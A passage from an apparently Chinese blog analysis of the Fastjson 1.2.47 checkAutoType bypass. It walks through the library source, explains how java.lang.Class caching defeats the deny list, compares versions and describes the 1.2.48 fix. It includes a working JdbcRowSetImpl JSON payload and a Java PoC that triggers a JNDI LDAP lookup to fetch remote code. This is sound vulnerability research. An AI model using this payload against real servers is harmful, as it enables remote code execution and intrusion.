<p>那换一条路看看<code>TypeUtils.getClassFromMapping(typeName)</code>。</p>
<h2 id="TypeUtils-getClassFromMapping-typeName"><a href="#TypeUtils-getClassFromMapping-typeName" class="headerlink" title="TypeUtils.getClassFromMapping(typeName)"></a>TypeUtils.getClassFromMapping(typeName)</h2><p>先看<code>getClassFromMapping</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这个map是一个hashmap</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ConcurrentMap&lt;String,Class&lt;?&gt;&gt; mappings = <span class="keyword">new</span> ConcurrentHashMap&lt;String,Class&lt;?&gt;&gt;(<span class="number">16</span>, <span class="number">0.75f</span>, <span class="number">1</span>);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className)&#123;</span><br><span class="line">        <span class="comment">//很简单的一个mapping的get</span></span><br><span class="line">        <span class="keyword">return</span> mappings.get(className);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>按照套路去寻找影响这个mappings的put方法。搜索<code>mappings.put</code>，在下面这两个方法中有找到：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings</span><br><span class="line">com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader, boolean)</span><br></pre></td></tr></table></figure>

<p>看<code>addBaseClassMappings</code>这个方法，它是一个没有传参的方法….这样我们就没有一个可控的参数去控制其中的内容。</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706163801667.png" alt="image-20200706163801667"></p>
<p>前者是一个static静态代码块：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span>&#123;</span><br><span class="line">        addBaseClassMappings();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>后者是一个<code>clearClassMapping</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">clearClassMapping</span><span class="params">()</span></span>&#123;</span><br><span class="line">    mappings.clear();</span><br><span class="line">    addBaseClassMappings();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没戏，不可控。</p>
<p>再看另一个有mappings.put的位置<code>TypeUtils.loadClass</code>，我们需要详细看看这个方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="keyword">boolean</span> cache) &#123;</span><br><span class="line">        <span class="comment">//判断className是否为空，是的话直接返回null</span></span><br><span class="line">        <span class="keyword">if</span>(className == <span class="keyword">null</span> || className.length() == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断className是否已经存在于mappings中</span></span><br><span class="line">        Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line">        <span class="keyword">if</span>(clazz != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="comment">//是的话，直接返回</span></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断className是否是[开头，1.2.44中针对限制的东西就是这个</span></span><br><span class="line">        <span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">'['</span>)&#123;</span><br><span class="line">            Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">            <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断className是否L开头;结尾，1.2.42/43中针对限制的就是这里，但都是在外面限制的，里面的东西没变</span></span><br><span class="line">        <span class="keyword">if</span>(className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>))&#123;</span><br><span class="line">            String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//1. 我们需要关注的mappings在这里有</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//输入的classLoader不为空时</span></span><br><span class="line">            <span class="keyword">if</span>(classLoader != <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="comment">//调用加载器去加载我们给的className</span></span><br><span class="line">                clazz = classLoader.loadClass(className);</span><br><span class="line">                <span class="comment">//！！如果cache为true！！</span></span><br><span class="line">                <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                    <span class="comment">//往我们关注的mappings中写入这个className</span></span><br><span class="line">                    mappings.put(className, clazz);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> clazz;<span class="comment">//返回加载出来的类</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="comment">// skip</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//2. 在这里也有，但是好像这里有关线程，比较严格。</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="keyword">if</span>(contextClassLoader != <span class="keyword">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class="line">                clazz = contextClassLoader.loadClass(className);</span><br><span class="line">                <span class="comment">//同样需要输入的cache为true，才有可能修改</span></span><br><span class="line">                <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                    mappings.put(className, clazz);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">            <span class="comment">// skip</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//3. 这里也有，限制很松</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//加载类</span></span><br><span class="line">            clazz = Class.forName(className);</span><br><span class="line">            <span class="comment">//直接放入mappings中</span></span><br><span class="line">            mappings.put(className, clazz);</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">            <span class="comment">// skip</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以发现如果可以控制输入参数，是可以往这个mappings中写入任意类名的（从而绕过autocheck的黑白名单）。</p>
<p>看看这个函数在什么地方被引用。</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706184302813.png" alt="image-20200706184302813"></p>
<p>在这里面只需要找到符合条件的即可，也就是第三个参数cache=true，发现在1206行，跳转过去看：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706184824853.png" alt="image-20200706184824853"></p>
<p>但跟进去发现这里是在调用自己内部本身，继续依次看，发现一个敏感接口：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">/com/alibaba/fastjson/serializer/MiscCodec.java#deserialze(DefaultJSONParser parser, Type clazz, Object fieldName):334</span><br></pre></td></tr></table></figure>

<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706190449802.png" alt="image-20200706190449802"></p>
<p>跟进去执行分析：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> </span>&#123;</span><br><span class="line">        JSONLexer lexer = parser.lexer;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4. clazz类型等于InetSocketAddress.class的处理。</span></span><br><span class="line">        <span class="comment">//我们需要的clazz必须为Class.class，不进入</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == InetSocketAddress<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object objVal;</span><br><span class="line">        <span class="comment">//3. 下面这段赋值objVal这个值</span></span><br><span class="line">        <span class="comment">//此处这个大的if对于parser.resolveStatus这个值进行了判断，我们在稍后进行分析这个是啥意思</span></span><br><span class="line">        <span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class="line">            <span class="comment">//当parser.resolveStatus的值为  TypeNameRedirect</span></span><br><span class="line">            parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class="line">            parser.accept(JSONToken.COMMA);</span><br><span class="line">            <span class="comment">//lexer为json串的下一处解析点的相关数据</span></span><br><span class="line">             <span class="comment">//如果下一处的类型为string</span></span><br><span class="line">            <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">                <span class="comment">//判断解析的下一处的值是否为val，如果不是val，报错退出</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">"val"</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//移动lexer到下一个解析点</span></span><br><span class="line">                <span class="comment">//举例："val":(移动到此处-&gt;)"xxx"</span></span><br><span class="line">                lexer.nextToken();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            parser.accept(JSONToken.COLON);</span><br><span class="line">            <span class="comment">//此处获取下一个解析点的值"xxx"赋值到objVal</span></span><br><span class="line">            objVal = parser.parse();</span><br><span class="line"></span><br><span class="line">            parser.accept(JSONToken.RBRACE);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//当parser.resolveStatus的值不为TypeNameRedirect</span></span><br><span class="line">            <span class="comment">//直接解析下一个解析点到objVal</span></span><br><span class="line">            objVal = parser.parse();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String strVal;</span><br><span class="line">        <span class="comment">//2. 可以看到strVal是由objVal赋值，继续往上看</span></span><br><span class="line">        <span class="keyword">if</span> (objVal == <span class="keyword">null</span>) &#123;</span><br><span class="line">            strVal = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            strVal = (String) objVal;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//不必进入的分支</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strVal == <span class="keyword">null</span> || strVal.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//省略诸多对于clazz类型判定的不同分支。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1. 可以得知，我们的clazz必须为Class.class类型</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == Class<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//我们由这里进来的loadCLass</span></span><br><span class="line">            <span class="comment">//strVal是我们想要可控的一个关键的值，我们需要它是一个恶意类名。往上看看能不能得到一个恶意类名。</span></span><br><span class="line">            <span class="keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>那么经过分析，我们可以得到的关注点又跑到<code>parser.resolveStatus</code>这上面来了</p>
<ol>
<li><p>当<code>parser.resolveStatus == TypeNameRedirect</code> 我们需要json串中有一个<strong>“val”:”恶意类名”</strong>，来进入if语句的true中，污染objVal，再进一步污染strVal。我们又需要<strong>clazz为class类</strong>来满足if判断条件进入loadClass。</p>
<p>所以一个json串的格式大概为<code>&quot;@type&quot;=&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;恶意类名&quot;</code> 这样一个东西，大概如此。</p>
</li>
<li><p>当<code>parser.resolveStatus ！= TypeNameRedirect</code>进入if判断的false中，可以直接污染objVal。</p>
<p>再加上<strong>clazz=class类</strong>，大概需要一个json串如下:<code>&quot;被屏蔽的type&quot;=&quot;java.lang.Class&quot;,&quot;恶意类名&quot;</code>。</p>
</li>
</ol>
<p>至于哪里调用了<code>MiscCodec.java#deserialze</code>，查看引用处其实可以发现这是一个非常多地方会调用到的常用函数，就比如解析过程中的<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)-384行</code></p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706193256474.png" alt="image-20200706193256474"></p>
<h2 id="定向构造payload"><a href="#定向构造payload" class="headerlink" title="定向构造payload"></a>定向构造payload</h2><p>那么在得到如上信息中，我们就不必一直大海摸虾。之前拿到了两个分支paylaod，拿一个可能的paylaod，试试水看看能不能往TypeUtils.getClassFromMapping(typeName）里面的mapping污染我们的恶意类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"@type"</span>: <span class="string">"java.lang.Class"</span>, </span><br><span class="line">    <span class="string">"val"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先是日常进入解析主要函数<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code></p>
<p>这里有我们的三个在乎的点，如下顺序：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">parseObject</span><span class="params">(<span class="keyword">final</span> Map object, Object fieldName)</span> </span>&#123;</span><br><span class="line">   ...  </span><br><span class="line">   <span class="comment">//先是checkAutoType这个万恶的过滤函数</span></span><br><span class="line">   clazz = config.checkAutoType(typeName, <span class="keyword">null</span>, lexer.getFeatures());</span><br><span class="line">   ...</span><br><span class="line">   <span class="comment">//ResolveStatus的赋值</span></span><br><span class="line">   <span class="keyword">this</span>.setResolveStatus(TypeNameRedirect);</span><br><span class="line">   <span class="comment">//污染TypeUtils.getClassFromMapping的触发处</span></span><br><span class="line">   Object obj = deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class, int)</code>这个分析过了。</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706195524423.png" alt="image-20200706195524423"></p>
<p>step out之后继续跟进，可以看到，给ResolveStatus赋值了TypeNameRedirect，这样到deserialze里面就可以确定了分支，与预计吻合。</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706200040175.png" alt="image-20200706200040175"></p>
<p>继续跟，就到了第三个关注点deserialize函数：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706200201139.png" alt="image-20200706200201139"></p>
<p>果断跟进去！</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706201609999.png" alt="image-20200706201609999"></p>
<p>继续跟，恶意类被解析赋值！</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706201735423.png" alt="image-20200706201735423"></p>
<p>跳过后续的一堆if判断，来到符合条件的clazz对象，跟进去：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706201836682.png" alt="image-20200706201836682"></p>
<p>默认的cache为true，接下来就会进入三个mapping.put条件，跟下去，看看哪个能触发：</p>
<p>第一个，发现classloader是null，被skip掉了。</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706202152124.png" alt="image-20200706202152124"></p>
<p>来到第二个，跟进去，发现被加入到map中了，sum+1：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706202451082.png" alt="image-20200706202451082"></p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/20200102094438-6facdc2e-2d01-1.jpg" alt="img"></p>
<p>第二个if中，帮我们加载了一个classloader，再因为上一层的cache默认为true，就真的执行成功了<code>mappings.put</code>放入了我们的恶意类名！</p>
<p>完美穿针引线，一环扣一环，往mappings中加入了我们的恶意类。</p>
<p>老习惯，附上调用栈：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/20200102094438-6fc52b08-2d01-1.jpg" alt="img"></p>
<h2 id="定稿payload"><a href="#定稿payload" class="headerlink" title="定稿payload"></a>定稿payload</h2><p>之前看到其他博客说，一开始payload是分成两截，因为服务器的mappings自从加过恶意类之后，就会一直保持，然后就可以随便打了。</p>
<p>但是之后为了不让负载均衡，平摊payload造成有几率失败，就变成了下面这个：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"a"</span>:&#123;</span><br><span class="line">        <span class="string">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="string">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"b"</span>:&#123;</span><br><span class="line">        <span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>,</span><br><span class="line">        <span class="string">"autoCommit"</span>:<span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImplPoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        String payload  = <span class="string">"&#123;\"a\":&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,"</span></span><br><span class="line">                + <span class="string">"\"b\":&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","</span></span><br><span class="line">                + <span class="string">"\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\"autoCommit\":true&#125;&#125;"</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706202953984.png" alt="image-20200706202953984"></p>
<p>本次Fastjson反序列化漏洞也是基于checkAutoType()函数绕过的，并且无需开启AutoTypeSupport，大大提高了成功利用的概率。</p>
<p>绕过的大体思路是通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，checkAutoType()就会抛出异常终止程序。</p>
<p>回顾一下审计的过程：</p>
<p>我们进入com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</p>
<ol>
<li>checkAutoType方法拿到Class.class</li>
<li>设置了ResolveStatus为TypeNameRedirect，决定了之后deserialze中的if走向</li>
<li>进入deserializer.deserialze</li>
</ol>
<p>com.alibaba.fastjson.serializer.MiscCodec#deserialze</p>
<ol>
<li>parser.resolveStatus为TypeNameRedirect，进入if为true走向</li>
<li>解析”val”:”恶意类名”，放入objVal，再传递到strVal</li>
<li>因为clazz=Class.class，进入TypeUtils.loadClass，传入strVal</li>
</ol>
<p>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader)</p>
<ol>
<li>添加默认cache为true，调用loadClass</li>
</ol>
<p>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader, boolean)</p>
<ol>
<li>三个改变mappings的第一处，由于classLoader=null，不进入</li>
<li>三个改变mappings的第二处，classLoader=null，进入；获取线程classLoader，由于cache为true，添加mappings。</li>
</ol>
<h1 id="关于AutoTypeSupport"><a href="#关于AutoTypeSupport" class="headerlink" title="关于AutoTypeSupport"></a>关于AutoTypeSupport</h1><p>可以看到实际上还是利用了com.sun.rowset.JdbcRowSetImpl这条利用链来攻击利用的，因此除了JDK版本外几乎没有限制。</p>
<p>但是如果目标服务端开启了AutoTypeSupport呢？经测试发现：</p>
<ul>
<li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</li>
<li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</li>
</ul>
<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><h3 id="受AutoTypeSupport影响的版本"><a href="#受AutoTypeSupport影响的版本" class="headerlink" title="受AutoTypeSupport影响的版本"></a>受AutoTypeSupport影响的版本</h3><p>受AutoTypeSupport影响的版本为1.2.25-1.2.32，本次调试的是1.2.25版本。</p>
<h4 id="开启AutoTypeSupport时"><a href="#开启AutoTypeSupport时" class="headerlink" title="开启AutoTypeSupport时"></a>开启AutoTypeSupport时</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>

<p>发现报错：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706204309011.png" alt="image-20200706204309011"></p>
<p>调试发现，在第一部分JSON数据的解析中，checkAutoType()函数的处理过程和前面是差不多的。能够成功通过该函数的检测，因此问题不在这，继续往下调试。</p>
<p>在第二部分JSON数据的解析中，@type指向的”com.sun.rowset.JdbcRowSetImpl”在checkAutoType()函数中会被dentList黑名单中的”com.sun.”匹配到，因此会直接报错显示不支持：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706205306004.png" alt="image-20200706205306004"></p>
<h4 id="未开启AutoTypeSupport时"><a href="#未开启AutoTypeSupport时" class="headerlink" title="未开启AutoTypeSupport时"></a>未开启AutoTypeSupport时</h4><p>当不开启AutoTypeSupport时就不会进入该黑白名单校验的代码逻辑中，就不会被过滤报错。</p>
<p>这里，我们换个不受AutoTypeSupport影响的且未使用哈希黑名单的版本来方便我们进行对比查看，这里选了1.2.33，看下checkAutoType()中对应的代码：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706211622134.png" alt="image-20200706211622134"></p>
<p>对比黑名单校验的if判断语句条件就知道了，为什么后面的版本不受影响，那是因为通过<code>&amp;&amp;</code>多添加了一个判断条件<code>TypeUtils.getClassFromMapping(typeName) == null</code>，但是第二部分JSON内容中的类已经通过第一部分解析的时候加载到Map中缓存了，因此该条件不成立从而成功绕过：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 受AutoTypeSupport影响的版本</span></span><br><span class="line"><span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不受AutoTypeSupport影响的版本</span></span><br><span class="line"><span class="keyword">if</span> (className.startsWith(deny) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br></pre></td></tr></table></figure>

<h3 id="不受AutoTypeSupport影响的版本"><a href="#不受AutoTypeSupport影响的版本" class="headerlink" title="不受AutoTypeSupport影响的版本"></a>不受AutoTypeSupport影响的版本</h3><p>不受AutoTypeSupport影响的版本为1.2.33-1.2.47，本次调试的是1.2.47版本。</p>
<h4 id="未开启AutoTypeSupport时-1"><a href="#未开启AutoTypeSupport时-1" class="headerlink" title="未开启AutoTypeSupport时"></a>未开启AutoTypeSupport时</h4><p>在调用DefaultJSONParser.parserObject()函数时，其会对JSON数据进行循环遍历扫描解析。</p>
<p>在第一次扫描解析中，进行checkAutoType()函数，由于未开启AutoTypeSupport，因此不会进入黑白名单校验的逻辑；由于@type执行java.lang.Class类，该类在接下来的findClass()函数中直接被找到，并在后面的if判断clazz不为空后直接返回：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706212531680.png" alt="image-20200706212531680"></p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706212622129.png" alt="image-20200706212622129"></p>
<p>往下调试，调用到MiscCodec.deserialze()，其中判断键是否为”val”，是的话再提取val键对应的值赋给objVal变量，而objVal在后面会赋值给strVal变量：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706212816333.png" alt="image-20200706212816333"></p>
<p>接着判断clazz是否为Class类，是的话调用TypeUtils.loadClass()加载strVal变量值指向的类：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706212914209.png" alt="image-20200706212914209"></p>
<p>在TypeUtils.loadClass()函数中，成功加载com.sun.rowset.JdbcRowSetImpl类后，就会将其缓存在Map中：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/5.png" alt="img"></p>
<p>在扫描第二部分的JSON数据时，由于前面第一部分JSON数据中的val键值”com.sun.rowset.JdbcRowSetImpl”已经缓存到Map中了，所以当此时调用TypeUtils.getClassFromMapping()时能够成功从Map中获取到缓存的类，进而在下面的判断clazz是否为空的if语句中直接return返回了，从而成功绕过checkAutoType()检测：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/6-20200706213237782.png" alt="img"></p>
<h4 id="开启AutoTypeSupport"><a href="#开启AutoTypeSupport" class="headerlink" title="开启AutoTypeSupport"></a>开启AutoTypeSupport</h4><p>由前面知道，开启AutoTypeSupport后，在checkAutoType()函数中会进入黑白名单校验的代码逻辑。</p>
<p>在第一部分JSON数据的扫描解析中，由于@type指向java.lang.Class，因此即使是开启AutoTypeSupport先后进行白名单、黑名单校验的情况下都能成功通过检测，之后和前面的一样调用findClass()函数获取到Class类：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/7.png" alt="img"></p>
<p>关键在于第二部分JSON数据的扫描解析。第二部分的@type指向的是利用类”com.sun.rowset.JdbcRowSetImpl”，其中的”com.sun.”是在denyList黑名单中的，但是为何在检测时能成功绕过呢？</p>
<p>我们调试发现，逻辑是先进行白名单再进行黑名单校验，在黑名单校验的if判断条件中是存在两个必须同时满足的条件的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br></pre></td></tr></table></figure>

<p>第一个判断条件<code>Arrays.binarySearch(denyHashCodes, hash) &gt;= 0</code>是满足的，因为我们的@type包含了黑名单的内容；关键在于第二个判断条件<code>TypeUtils.getClassFromMapping(typeName) == null</code>，这里由于前面已经将com.sun.rowset.JdbcRowSetImpl类缓存在Map中了，也就是说该条件并不满足，导致能够成功绕过黑名单校验、成功触发漏洞。</p>
<h1 id="1-2-48-修复"><a href="#1-2-48-修复" class="headerlink" title="1.2.48 修复"></a>1.2.48 修复</h1><p>1.2.48中的修复措施是，在loadClass()时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存了。同时将Class类加入到了黑名单中。</p>
<p>运行会报错：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Exception in thread <span class="string">"main"</span> com.alibaba.fastjson.JSONException: autoType is not support. com.sun.rowset.JdbcRowSetImpl</span><br></pre></td></tr></table></figure>

<p>调试分析，在调用TypeUtils.loadClass()时中，缓存开关cache默认设置为了False，对比下两个版本的就知道了。</p>
<p>对比代码。修改了cache这一处。（右侧为1.2.47代码）</p>
<p>本来应该进入一个loadClass（两个参数）的方法，然后默认cache为true，在进入三个参数的loadClass。</p>
<p>现在这边直接指定过来三个参数loadClass同时cache为false。</p>
